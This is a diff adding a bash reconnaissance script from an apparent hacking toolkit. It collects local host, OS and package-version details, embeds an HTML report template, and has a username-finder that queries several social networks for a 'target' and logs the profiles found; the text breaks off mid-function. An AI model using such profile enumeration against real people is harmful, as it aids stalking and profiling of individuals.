@@ -1,0 +1,2604 @@
+#!/bin/sh
+#!/bin/bash
+#!/usr/bin/sh
+#!/usr/bin/bash
+#!/usr/bin/env sh
+#!/usr/bin/env bash
+#!/data/data/com.termux/files/usr/bin/sh
+#!/data/data/com.termux/files/usr/bin/bash
+###############################################################
+#          Reconnaissance & Information Gathering             #
+#-Info--------------------------------------------------------#
+#    Enter Your Target, Hack Him, and Get Markdown Report     #
+#-About-------------------------------------------------------#
+#--╼▰[ Skils ]-╼▰[ MultiMan ]                                 #
+#--╼▰[ Part of ]-╼▰[ HacKingPro ]                             #
+#--╼▰[ Script Name ]-╼▰[ HacKingPro-01 ]                      #
+#--╼▰[ Author ]-╼▰[ AnLoMinus ]-╼▰[ Leon Yaakobov ]           #
+###############################################################
+# CREDIT: To All World Creators free Scripts & Tools          #
+# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE          #
+# GREAT SCRIPTS                                               #
+# Location: Made With LOVE IN ISRAEL !                        #
+###############################################################
+#-Metadata----------------------------------------------------#
+#--╼▰[ Version ]-╼▰[ 1.0.0 ]                                  #
+#--╼▰[ Source ]-╼▰[ https://github.com/AnLoMinus/HacKingPro ] #
+#--╼▰[ Created ]-╼▰[ 15-08-2022 ]                             #
+#--╼▰[ Update ]-╼▰[ 17-10-2022 ]                              #
+###############################################################
+
+#################################################
+#------╼╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [ Head ] #
+#################################################
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Get information about localhost ]
+Host_Info(){
+   cd "${MainDirectoriyCaseNameLocal}"
+	 dnsips=$(sed -e '/^$/d' /etc/resolv.conf | awk '{if (tolower($1)=="nameserver") print $2}')
+
+   echo "
+    ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ Hostname and DNS information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-
+
+    ${DGrey}┌───────╼ ${BRed}[${BYellow} Hostname and DNS information ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${ORANGE} Hostname : ${resetT}${ORANGE}${faintT}$(hostname)
+    ${DGrey}|──╼ ${BRed}[${ORANGE} DNS domain : ${resetT}${ORANGE}${faintT}$(hostname -d)
+    ${DGrey}|──╼ ${BRed}[${ORANGE} Fully qualified domain name : ${resetT}${ORANGE}${faintT}$(hostname -f)
+    ${DGrey}|──╼ ${BRed}[${ORANGE} Network address (IP) :  ${resetT}${ORANGE}${faintT}$(hostname -i)
+    ${DGrey}┖──╼ ${BRed}[${ORANGE} DNS name servers (DNS IP) ${resetT}${ORANGE}${faintT}: ${dnsips}
+
+    ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ Hostname and DNS information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-
+    "
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Get Bacsic Information About OS ]
+BasicInfo() {
+  # Checking Basic Information
+  knam=$(uname -s)    2> /dev/null # Kernel name
+  krel=$(uname -r)    2> /dev/null # Kernel release
+  kver=$(uname -v)    2> /dev/null # Kernel version
+  arch=$(uname -m)    2> /dev/null # Architecture
+  echo "
+  ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ Basic Information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-
+
+  ${DGrey}┌───────╼ ${BRed}[${BYellow} System Information ${BRed}]
+  ${DGrey}|
+  ${DGrey}|──╼ ${BRed}[${BYellow} Script ID:      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} $$ ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} Kernel Name     ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${knam} ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} Kernel Release  ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${krel} ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} kernel Version  ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${kver} ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} Architecture    ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${arch} ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} Term            ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${TERM} ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} Shell           ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} $SHELL ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} Date            ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} $(date) ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} UpTime          ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} $(uptime) ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} OS Name         ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${osys} ${BRed}]
+  ${DGrey}|──╼ ${BRed}[${BYellow} Path            ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} \n$PATH ${BRed}]
+  ${DGrey}┖──╼ ${BRed}[${BYellow} who is currently logged in:${LYellow} \n$(who)
+
+  ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ Basic Information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-"
+
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Get Bacsic Information About MacOS ]
+Mac_Host_Info(){
+  # reports system Hardware and software configuration
+  echo"
+    Examples:
+
+    system_profiler
+       Generates a text report with the standard detail level.
+
+    system_profiler -detailLevel mini
+       Generates a short report without identifying/personal information.
+
+    system_profiler -listDataTypes
+       Shows a list of the available data types.
+
+    system_profiler SPSoftwareDataType SPNetworkDataType
+       Generates a text report containing only software and network data.
+
+    system_profiler -xml >MySystem.spx
+       Creates a XML file which can be opened by System Profiler.app
+
+
+    Available Datatypes:
+      SPParallelATADataType
+      SPUniversalAccessDataType
+      SPSecureElementDataType
+      SPApplicationsDataType
+      SPAudioDataType
+      SPBluetoothDataType
+      SPCameraDataType
+      SPCardReaderDataType
+      SPiBridgeDataType
+      SPDeveloperToolsDataType
+      SPDiagnosticsDataType
+      SPDisabledSoftwareDataType
+      SPDiscBurningDataType
+      SPEthernetDataType
+      SPExtensionsDataType
+      SPFibreChannelDataType
+      SPFireWireDataType
+      SPFirewallDataType
+      SPFontsDataType
+      SPFrameworksDataType
+      SPDisplaysDataType
+      SPHardwareDataType
+      SPInstallHistoryDataType
+      SPInternationalDataType
+      SPLegacySoftwareDataType
+      SPNetworkLocationDataType
+      SPLogsDataType
+      SPManagedClientDataType
+      SPMemoryDataType
+      SPNVMeDataType
+      SPNetworkDataType
+      SPPCIDataType
+      SPParallelSCSIDataType
+      SPPowerDataType
+      SPPrefPaneDataType
+      SPPrintersSoftwareDataType
+      SPPrintersDataType
+      SPConfigurationProfileDataType
+      SPRawCameraDataType
+      SPSASDataType
+      SPSerialATADataType
+      SPSPIDataType
+      SPSmartCardsDataType
+      SPSoftwareDataType
+      SPStartupItemDataType
+      SPStorageDataType
+      SPSyncServicesDataType
+      SPThunderboltDataType
+      SPUSBDataType
+      SPNetworkVolumeDataType
+      SPWWANDataType
+      SPAirPortDataType
+
+
+
+
+
+"
+
+}
+HKP_HTML_Export(){
+  echo '
+  <!DOCTYPE html>
+<html lang="en" class="g7">
+<!-- Version: 1.0.2 -->
+<!-- Title: AnLoMinus -->
+<!-- Aouthor: Leon Yaakobov -->
+<!-- Last Update: 10-09-2022 -->
+
+<head>
+  <meta charset="utf-8">
+  <meta name="description" content="Leon Yaakobov | Official">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+  <meta name="google-site-verification" content="+nxGUDJ4QpAZ5l9Bsjdi102tLVC21AIh5d1Nl23908vVuFHs34=">
+  <title>AnLoMinus</title>
+  <title>Leon Yaakobov</title>
+  <meta name="theme-color" content="#f4f4f4" />
+  <title>AnLoMinus, RhytMix, MultiMan</title>
+  <link rel="stylesheet" href="HacKingPro-Parts/main.css">
+  <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.7.0/vanilla-tilt.min.js"></script> -->
+  <style media="screen">
+    @import "https://fonts.googleapis.com/css?family=Roboto+Mono:100";
+
+    html {
+      font-family: "Roboto Mono", monospace;
+      background: #212121;
+      height: 100%;
+      width: auto;
+    }
+
+    body {
+      font-family: "Roboto Mono", monospace;
+      background: #212121;
+    }
+  </style>
+  <style media="screen">
+    @import url("https://fonts.googleapis.com/css2?family=Inconsolata:wght@300&display=swap");
+
+    .card.hackbox {
+      background-color: #141d2b;
+    }
+
+    .hackbox-heading {
+      color: #9fef00;
+    }
+
+    .hackbox-heading:hover {
+      color: #ffe700;
+    }
+
+    .hackbox p {
+      color: #a4b1cd;
+    }
+
+    .hb {
+      color: #9fef00;
+    }
+
+    .hb:hover {
+      color: #fff;
+    }
+
+    .card.tryhackme {
+      background-color: #161e2d;
+    }
+
+    .tryhackme-heading {
+      color: #a6170e;
+      font-family: "Ubuntu Mono", monospace;
+    }
+
+    .tryhackme-heading:hover {
+      color: #fff;
+    }
+
+    .tryhackme p {
+      color: #8e929c;
+      font-family: "Ubuntu", sans-serif;
+    }
+
+    .tryhackme p:hover {
+      color: #fff;
+    }
+
+    .tr:hover {
+      color: #88cc14;
+    }
+
+    .tr {
+      color: #a6170e;
+    }
+
+    h2 {
+      color: #0a0a23;
+      font-size: 2.5rem;
+      text-align: center;
+      font-family: "Roboto", sans-serif;
+    }
+
+    p {
+      color: #0a0a23;
+      margin: 20px 20px;
+      font-family: "Roboto", sans-serif;
+      padding: 10px 20px;
+    }
+
+    ul {
+      list-style: none;
+      width: 100%;
+      display: flex;
+      justify-content: space-evenly;
+      padding-top: 30px;
+    }
+
+    i {
+      color: #0a0a23;
+      font-size: 2em;
+      transition: all 0.3s ease;
+    }
+
+    i:hover {
+      transform: translate3d(0, -12px, 22px);
+      color: #616171;
+    }
+
+    .material-icons-outlined {
+      color: #767676;
+    }
+
+    h2 {
+      transition: all 0.4s ease;
+    }
+
+    h2:hover {
+      transform: translate3d(0, -10px, 20px);
+      color: #616171;
+    }
+
+    h5 {
+      font-family: "Jost", sans-serif;
+    }
+
+    footer {
+      flex-wrap: wrap;
+    }
+
+    a {
+      text-decoration: none;
+    }
+  </style>
+  <style media="screen">
+    .g9 {
+      background-image: linear-gradient(90deg,
+          rgb(168, 86, 201) 0%,
+          rgb(168, 86, 201) 3%,
+          rgb(140, 74, 173) 3%,
+          rgb(140, 74, 173) 11%,
+          rgb(112, 61, 145) 11%,
+          rgb(112, 61, 145) 20%,
+          rgb(85, 49, 118) 20%,
+          rgb(85, 49, 118) 49%,
+          rgb(57, 37, 90) 49%,
+          rgb(57, 37, 90) 71%,
+          rgb(29, 24, 62) 71%,
+          rgb(29, 24, 62) 72%,
+          rgb(1, 12, 34) 72%,
+          rgb(1, 12, 34) 100%),
+        linear-gradient(67.5deg,
+          rgb(168, 86, 201) 0%,
+          rgb(168, 86, 201) 3%,
+          rgb(140, 74, 173) 3%,
+          rgb(140, 74, 173) 11%,
+          rgb(112, 61, 145) 11%,
+          rgb(112, 61, 145) 20%,
+          rgb(85, 49, 118) 20%,
+          rgb(85, 49, 118) 49%,
+          rgb(57, 37, 90) 49%,
+          rgb(57, 37, 90) 71%,
+          rgb(29, 24, 62) 71%,
+          rgb(29, 24, 62) 72%,
+          rgb(1, 12, 34) 72%,
+          rgb(1, 12, 34) 100%),
+        linear-gradient(112.5deg,
+          rgb(168, 86, 201) 0%,
+          rgb(168, 86, 201) 3%,
+          rgb(140, 74, 173) 3%,
+          rgb(140, 74, 173) 11%,
+          rgb(112, 61, 145) 11%,
+          rgb(112, 61, 145) 20%,
+          rgb(85, 49, 118) 20%,
+          rgb(85, 49, 118) 49%,
+          rgb(57, 37, 90) 49%,
+          rgb(57, 37, 90) 71%,
+          rgb(29, 24, 62) 71%,
+          rgb(29, 24, 62) 72%,
+          rgb(1, 12, 34) 72%,
+          rgb(1, 12, 34) 100%),
+        linear-gradient(45deg,
+          rgb(168, 86, 201) 0%,
+          rgb(168, 86, 201) 3%,
+          rgb(140, 74, 173) 3%,
+          rgb(140, 74, 173) 11%,
+          rgb(112, 61, 145) 11%,
+          rgb(112, 61, 145) 20%,
+          rgb(85, 49, 118) 20%,
+          rgb(85, 49, 118) 49%,
+          rgb(57, 37, 90) 49%,
+          rgb(57, 37, 90) 71%,
+          rgb(29, 24, 62) 71%,
+          rgb(29, 24, 62) 72%,
+          rgb(1, 12, 34) 72%,
+          rgb(1, 12, 34) 100%),
+        linear-gradient(90deg, rgb(95, 3, 74), rgb(35, 65, 96));
+      background-blend-mode: overlay, overlay, overlay, overlay, normal;
+    }
+
+    .g7 {
+      background-image: radial-gradient(circle at center center,
+          transparent 0%,
+          rgb(33, 33, 33) 99%),
+        repeating-linear-gradient(0deg,
+          rgba(163, 163, 163, 0.2) 0px,
+          rgba(163, 163, 163, 0.2) 1px,
+          transparent 1px,
+          transparent 6px),
+        repeating-linear-gradient(90deg,
+          rgba(163, 163, 163, 0.2) 0px,
+          rgba(163, 163, 163, 0.2) 1px,
+          transparent 1px,
+          transparent 6px),
+        linear-gradient(90deg, rgb(33, 33, 33), rgb(33, 33, 33));
+    }
+  </style>
+</head>
+
+<body class="col-md g7">
+  <div class="row card-body col-md gradient-border raise">
+    <div class="col-md " id="output">
+      <style>
+        #output {
+          padding-left: 1em;
+          font-size: 24px;
+          color: #f4f4f4;
+        }
+      </style>
+      <!-- partial -->
+      <script>
+        setInterval(function() {
+          var date = new Date();
+          var format = [
+            ("0" + date.getHours()).substr(-2), ("0" + date.getMinutes()).substr(-2), ("0" + date.getSeconds()).substr(-2)
+          ].join(":");
+          document.getElementById("output").innerHTML = format;
+        }, 500);
+      </script>
+
+    </div>
+    <div class="col-md ">
+
+    </div>
+    <div class="col-md " style="text-align:right;">
+      בס״ד
+    </div>
+  </div>
+  <div class="text-center card-header gradient-border raise" id="MainTitle">
+    <div class="glitch firstText b2" data-text="AnLoMinus">
+      <h1>AnLoMinus</h1>
+    </div>
+    <style>
+      < !--#spinner,
+      .face.back,
+      h1 {
+        text-align: center
+      }
+
+      body {
+        background: #000;
+        font-family: Tahoma, Verdana, sans-serif
+      }
+
+      .type1,
+      .type2,
+      h1 {
+        font-family: Orbitron
+      }
+
+      h1 {
+        font-size: 50px;
+        /* margin: 1px; */
+        /* text-transform: uppercase */
+      }
+
+      .red,
+      .type1 {
+        font-size: 21px
+      }
+
+      #spinner {
+        animation-name: spinner;
+        animation-timing-function: linear;
+        animation-iteration-count: infinite;
+        animation-duration: 7s;
+        transform-style: preserve-3d
+      }
+
+      @keyframes spinner {
+        from {
+          transform: rotateY(0)
+        }
+
+        to {
+          transform: rotateY(-360deg)
+        }
+      }
+
+      .face {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        backface-visibility: hidden
+      }
+
+      #div1,
+      h2 span {
+        position: relative
+      }
+
+      .face.back {
+        display: block;
+        transform: rotateY(180deg);
+        box-sizing: border-box;
+        color: #fff
+      }
+
+      #div1 {
+        left: -66px;
+        top: 140px;
+        height: 250px;
+        width: 100px;
+        -webkit-perspective: 150px;
+        perspective: 150px
+      }
+
+      #div2 {
+        height: 1px;
+        width: 150px;
+        padding: 50px;
+        border: 1px solid #000;
+        border-radius: 20px;
+        background-color: rgba(255, 255, 255, .11);
+        -webkit-transform: rotateX(45deg);
+        transform: rotateX(45deg)
+      }
+
+      h2 span {
+        top: -60px
+      }
+
+      .red {
+        color: #FF5E5E;
+        text-shadow: 0 0 15px #FF5E5E;
+        text-shadow: 0 0 15px #fff;
+        -webkit-transition: width .5s;
+        -webkit-animation: loading 5s ease-out infinite
+      }
+
+      @-webkit-keyframes loading {
+
+        0%,
+        100% {
+          opacity: .2
+        }
+
+        50% {
+          opacity: 1
+        }
+      }
+
+      .type1 {
+        color: #3c3
+      }
+
+      .type2 {
+        color: #999;
+        font-size: 20px
+      }
+
+      .kcf {
+        --interval: 4s;
+        color: #d4d4d4;
+        /* color: tomato; */
+        --color1: orangered;
+        --color2: firebrick;
+        --color3: maroon;
+        --color4: darkred;
+        text-shadow:
+          0 0 10px var(--color1),
+          0 0 20px var(--color2),
+          0 0 30px var(--color3),
+          0 0 40px var(--color4);
+        will-change: filter, color;
+        filter: saturate(60%);
+        animation: flicker steps(100) var(--interval) 1s infinite;
+        font-family: Yellowtail;
+
+        @keyframes flicker {
+          50% {
+            color: white;
+            filter: saturate(200%) hue-rotate(20deg);
+          }
+        }
+      }
+
+      /* <script language="JavaScript1.2">function ClearError(){return!0}window.onerror=ClearError;
+      -->
+      </script> */
+    </style>
+    <script>
+      window.onload = function() {
+        var n, e = document.getElementsByTagName("h1")[0],
+          a = e.innerText || e.textContent,
+          t = [],
+          l = 0,
+          o = null;
+        for (n = 0; n < a.length; ++n) t.push("<span>" + a[n] + "</span>");
+        e.innerHTML = t.join(""), t = e.childNodes;
+        var r = function() {
+          for (l += .01, l >= 1 && clearInterval(o), n = 0; n < t.length; ++n) Math.random() < l ? t[n].className = "kcf" : t[n].className = ""
+        };
+        setInterval(r, 100)
+      };
+    </script>
+
+  </div>
+  <div class="text-center card-header gradient-border raise g7" id="MainTitle">
+    <style media="screen">
+      @import "https://fonts.googleapis.com/css?family=Roboto+Mono:100";
+
+
+      #glitch {
+        height: 100%;
+        width: 100%;
+        justify-content: center;
+        align-items: center;
+        display: flex;
+      }
+
+      #glitch {
+        font-weight: 700;
+        font-size: 28px;
+        color: #FAFAFA;
+      }
+
+      #glitch>.text>.dud {
+        color: red;
+      }
+
+      #glitch {
+        animation: 1500ms infinite normal glitch;
+      }
+
+      #glitch>span#cursor {
+        animation: 1500ms infinite normal cursor;
+      }
+
+      @keyframes glitch {
+        0% {
+          opacity: 0;
+          left: 0px;
+        }
+
+        40% {
+          opacity: 1;
+          left: -2px;
+        }
+
+        80% {
+          opacity: 1;
+          left: -2px;
+        }
+      }
+
+      @keyframes cursor {
+        0% {
+          opacity: 0;
+          left: 0px;
+        }
+
+        40% {
+          opacity: 0;
+          left: -2px;
+        }
+
+        80% {
+          opacity: 1;
+          left: -2px;
+        }
+      }
+    </style>
+    <div id="glitch">
+      &nbsp;<div class="text"></div><span id="cursor">█</span>
+    </div>
+    <!-- partial -->
+    <script>
+      class TextScramble {
+        constructor(el) {
+          this.el = el
+          this.chars = "!<>-_\\/[]{}—=+*^?#________"
+          this.update = this.update.bind(this)
+        }
+        setText(newText) {
+          const oldText = this.el.innerText
+          const length = Math.max(oldText.length, newText.length)
+          const promise = new Promise((resolve) => this.resolve = resolve)
+          this.queue = []
+          for (let i = 0; i < length; i++) {
+            const from = oldText[i] || ''
+            const to = newText[i] || ''
+            const start = Math.floor(Math.random() * 40)
+            const end = start + Math.floor(Math.random() * 40)
+            this.queue.push({
+              from,
+              to,
+              start,
+              end
+            })
+          }
+          cancelAnimationFrame(this.frameRequest)
+          this.frame = 0
+          this.update()
+          return promise
+        }
+        update() {
+          let output = ''
+          let complete = 0
+          for (let i = 0, n = this.queue.length; i < n; i++) {
+            let {
+              from,
+              to,
+              start,
+              end,
+              char
+            } = this.queue[i]
+            if (this.frame >= end) {
+              complete++
+              output += to
+            } else if (this.frame >= start) {
+              if (!char || Math.random() < 0.28) {
+                char = this.randomChar()
+                this.queue[i].char = char
+              }
+              output += `<span class="dud">${char}</span>`
+            } else {
+              output += from
+            }
+          }
+          this.el.innerHTML = output
+          if (complete === this.queue.length) {
+            this.resolve()
+          } else {
+            this.frameRequest = requestAnimationFrame(this.update)
+            this.frame++
+          }
+        }
+        randomChar() {
+          return this.chars[Math.floor(Math.random() * this.chars.length)]
+        }
+      }
+
+      // ——————————————————————————————————————————————————
+      // Example
+      // ——————————————————————————————————————————————————
+
+      const phrases = [
+        "Hello World 👋🏼",
+        "My Name is",
+        "Leon Yaakobov",
+        "Im Freelancer",
+        "Im Multi Man",
+        "Bug Hunter",
+        "PC Technical",
+        "Sound Editor",
+        "Web Developer",
+        "Ethical Hacker",
+        "Graphic Designer",
+        "Product Promotion",
+        "Video Productions",
+        "Penetration Tester",
+        "Projects Management",
+        "Systems Administration",
+        ""
+      ]
+
+      const el = document.querySelector('.text')
+      const fx = new TextScramble(el)
+
+      let counter = 0
+      const next = () => {
+        fx.setText(phrases[counter]).then(() => {
+          setTimeout(next, 999)
+        })
+        counter = (counter + 1) % phrases.length
+      }
+
+      next()
+    </script>
+  </div>
+</body>
+<p class="text-center raise gradient-border tryhackme-heading"> © CopyRight | Leon Yaakobov | Israel ©
+<p>
+
+' > ${targetNAME}_HKP_REPORT.html
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Get information about Packages ]
+PackVersion() {
+  # Checking Versions Of Packages
+  vrgcc=`  	gcc --version |  	head -1       |  	awk -F ' ' '{printf $NF}'  	` 2> /dev/null
+  vbash=`  	bash --version |  	head -1        |  	awk -F ' ' '{printf $4}'  	` 2> /dev/null
+  vsudo=`  	sudo --version |  	head -1        |  	awk -F ' ' '{printf $3}'  	` 2> /dev/null
+  vjava=`  	java --version |  	head -1        |  	awk -F ' ' '{print $2}'  	` 2> /dev/null
+  vcurl=`  	curl --version |  	head -1        |  	awk -F ' ' '{print $2}'  	` 2> /dev/null
+  vwget=`  	wget --version |  	head -1        |  	awk -F ' ' '{print $3}'  	` 2> /dev/null
+  vruby=`  	ruby --version |  	awk -F ' ' '{print $2}'  	` 2> /dev/null
+  vpyt3=`  	python3 --version |  	awk -F ' ' '{print $2}'  	` 2> /dev/null
+  vpyt2=`  	python2 --version 2>&1 |  	awk -F ' ' '{print $2}'  	` 2> /dev/null
+  KERNEL=$(uname -r)
+
+  echo "
+    ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ Versions Information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-
+
+    ${DGrey}┌───────╼ ${BRed}[${BYellow} Versions Information ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${BYellow} Bash      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE} ${nc}$vbash ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${BYellow} sudo      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE} ${nc}$vsudo ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${BYellow} GCC       ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE} ${nc}$vrgcc ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${BYellow} Python 2  ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE} ${nc}$vpyt2 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${BYellow} Python 3  ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE} ${nc}$vpyt3 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${BYellow} Java      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE} ${nc}$vjava ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${BYellow} cURL      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE} ${nc}$vcurl ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──╼ ${BRed}[${BYellow} wget      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE} ${nc}$vwget ${BRed}]
+    ${DGrey}|
+    ${DGrey}┖──╼ ${BRed}[${BYellow} Ruby      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE} ${nc}$vruby ${BRed}]
+
+    ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ Versions Information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-"
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CSI ]--╼▰ [ User Finder ]
+UserFinder(){
+  cd "${MainDirectoriyCaseNamePlanning}"
+  echo "\n"
+  trap 'printf "\n";partial;exit 1' 2
+
+  partial() {
+    if [[ -e ${targetNAME}-UserFinder.txt ]]; then
+      printf "${BGreen}[${resetT}${BWhite}^^${resetT}${BGreen}] Saved:${resetT}${BWhite} %s.txt\n" $targetNAME
+    fi
+  }
+
+  scanner() {
+    # echo "${BGreen}[${resetT}${BWhite}>${resetT}${BGreen}] Input Username:${resetT} "
+    # read -p "$InputUser" targetNAME
+    if [[ -e ${targetNAME}-UserFinder.txt ]]; then
+      printf "    ${BGreen}[${resetT}${BWhite}X${resetT}${BGreen}] Removing previous file:${resetT}${BWhite} %s.txt" $targetNAME
+      rm -rf ${targetNAME}-UserFinder.txt
+    fi
+    printf "\n"
+    printf "    ${BGreen}[${resetT}${BWhite}>${resetT}${BGreen}] Checking username${resetT}${BWhite} %s${resetT}${BGreen} on: ${resetT}\n" $targetNAME
+
+    ## INSTAGRAM
+    check_insta=$(curl -s -H "Accept-Language: en" "https://www.instagram.com/$targetNAME" -L | grep -o 'The link you followed may be broken'; echo $?)
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Instagram: ${resetT}"
+    if [[ $check_insta == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.instagram.com/%s\n" $targetNAME
+      printf "https://www.instagram.com/%s\n" $targetNAME > ${targetNAME}-UserFinder.txt
+    elif [[ $check_insta == *'0'* ]]; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    fi
+
+    ## Facebook
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Facebook: ${resetT}"
+    check_face=$(curl -s "https://www.facebook.com/$targetNAME" -L -H "Accept-Language: en" | grep -o 'not found'; echo $?)
+    if [[ $check_face == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.facebook.com/%s\n" $targetNAME
+      printf "https://www.facebook.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    elif [[ $check_face == *'0'* ]]; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    fi
+
+    ## TWITTER
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Twitter: ${resetT}"
+    check_twitter=$(curl -s "https://www.twitter.com/$targetNAME" -L -H "Accept-Language: en" | grep -o 'page doesn’t exist'; echo $?)
+    if [[ $check_twitter == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.twitter.com/%s\n" $targetNAME
+      printf "https://www.twitter.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    elif [[ $check_twitter == *'0'* ]]; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    fi
+
+    ## YOUTUBE
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] YouTube: ${resetT}"
+    check_youtube=$(curl -s "https://www.youtube.com/$targetNAME" -L -H "Accept-Language: en" | grep -o 'Not Found'; echo $?)
+    if [[ $check_youtube == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.youtube.com/%s\n" $targetNAME
+      printf "https://www.youtube.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    elif [[ $check_youtube == *'0'* ]]; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    fi
+
+    ## BLOGGER
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Blogger: ${resetT}"
+    check=$(curl -s "https://$targetNAME.blogspot.com" -L -H "Accept-Language: en" -i | grep -o 'HTTP/2 404'; echo $?)
+    if [[ $check == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://%s.blogspot.com\n" $targetNAME
+      printf "https://%s.blogspot.com\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    elif [[ $check == *'0'* ]]; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    fi
+
+    ## GLOOGLE PLUS
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] GooglePlus: ${resetT}"
+    check=$(curl -s "https://plus.google.com/+$targetNAME/posts" -L -H "Accept-Language: en" -i | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://plus.google.com/+%s/posts\n" $targetNAME
+      printf "https://plus.google.com/+%s/posts\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    elif [[ $check == *'0'* ]]; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    fi
+
+    ## REDDIT
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Reddit: ${resetT}"
